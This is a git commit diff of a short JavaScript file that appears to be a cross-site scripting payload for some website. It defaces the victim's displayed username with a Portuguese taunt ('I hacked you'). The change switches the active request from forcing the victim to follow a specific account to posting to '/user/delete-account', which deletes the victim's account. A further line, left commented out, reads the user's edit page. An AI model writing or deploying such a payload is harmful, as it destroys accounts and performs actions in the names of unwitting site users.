4953e13793cc7c3107fa408e4383fca19f9ae2d9
kamimikaka <jessruss99@gmail.com>
2025-03-19 01:57:31 -0300

    Update kamimikaka.js

--- kamimikaka.js
+++ kamimikaka.js
@@ -2,8 +2,8 @@
 var testee = document.querySelector("#user-top > a.ml-10");
 testee.innerText = 'KKKK eu hackeei você!';
 
-$.ajax({url: '/user/follow/4318532',type: 'post',success: function(data) {alert('OK!')}});
-//$.ajax({url: '/user/delete-account',type: 'post',success: function(data) {alert('OK!')}});
+//$.ajax({url: '/user/follow/4318532',type: 'post',success: function(data) {alert('OK!')}});
+$.ajax({url: '/user/delete-account',type: 'post',success: function(data) {alert('OK!')}});
 //$.ajax({url: '/user/edit',type: 'get',success: function(data) {console.log(data)}});
 
 //kkkkkk
